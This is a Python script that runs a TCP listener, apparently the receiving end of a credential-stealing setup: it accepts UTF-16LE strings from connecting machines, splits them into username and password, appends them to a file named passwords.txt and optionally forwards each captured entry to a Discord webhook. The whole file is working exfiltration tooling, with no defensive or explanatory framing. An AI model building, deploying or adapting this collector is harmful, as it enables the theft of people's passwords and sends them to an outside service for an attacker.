import socket
from datetime import datetime
from colorama import Fore, Style, init
import requests
import argparse
import sys

# Initialize colorama
init()

def listen_for_utf16le_string(port, output_file='passwords.txt', discord_url=None):
    # Create a TCP socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Bind the socket to listen on the specified port
        sock.bind(('0.0.0.0', port))
        sock.listen()  # Start listening for incoming connections
        print(f"Listening on port {port}...")

        # Open the file to log the received data
        with open(output_file, 'a', encoding='utf-8') as file:
            while True:
                # Accept a new connection
                conn, addr = sock.accept()
                with conn:
                    while True:
                        # Receive data from the connection (buffer size 1024 bytes)
                        data = conn.recv(1024)
                        if not data:
                            break  # Exit the loop if no data is received

                        # Decode the data from UTF-16LE
                        try:
                            decoded_string = data.decode('utf-16le')

                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

                            # Terminal output with colors
                            output = (f"{Fore.RED}{addr[0]}{Style.RESET_ALL} :: " +  # IP in red
                                      f"{Fore.GREEN}{decoded_string.strip()}{Style.RESET_ALL} @@ " +  # String in green
                                      f"{Fore.BLUE}{timestamp}{Style.RESET_ALL}"  # Timestamp in blue
                                      )

                            # Save the plain output to file (without colors)
                            print(output)
                            passwd = decoded_string.partition(":")[2]
                            uname = decoded_string.strip().split(':')[0]
                            file.write(output + '\n')
                            file.flush()  # Ensure it's written immediately

                            # Send to Discord if URL is provided
                            if discord_url:
                                try:
                                    requests.post(
                                        discord_url,
                                        json={"content": addr[0] + ' @ ' + timestamp + " ```" + decoded_string + "```"}
                                    )
                                except requests.RequestException as e:
                                    print(f"Error with webhook: {e}")
                        except UnicodeDecodeError as e:
                            print(f"Error decoding UTF-16LE string: {e}")
                            continue

if __name__ == '__main__':
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Listen for UTF-16LE strings and optionally send to Discord.")
    parser.add_argument("--discord-url", help="Discord webhook URL to send the decoded strings.")
    parser.add_argument("--port", type=int, default=80, help="Port to listen on (default: 80).")
    parser.add_argument("--output-file", default="passwords.txt", help="File to save the received data (default: passwords.txt).")
    args = parser.parse_args()

    if not args.discord_url:
        print("No Discord URL provided. To use a web hook specify one with --discord-url.")
    if not args.output_file:
        print("No output file provided. Defaulting to passwords.txt, specify one with --output-file.")
    if not args.port:
        print("No port file provided. Defaulting to 80, specify one with --port.")
    
    listen_for_utf16le_string(port=args.port, output_file=args.output_file, discord_url=args.discord_url)
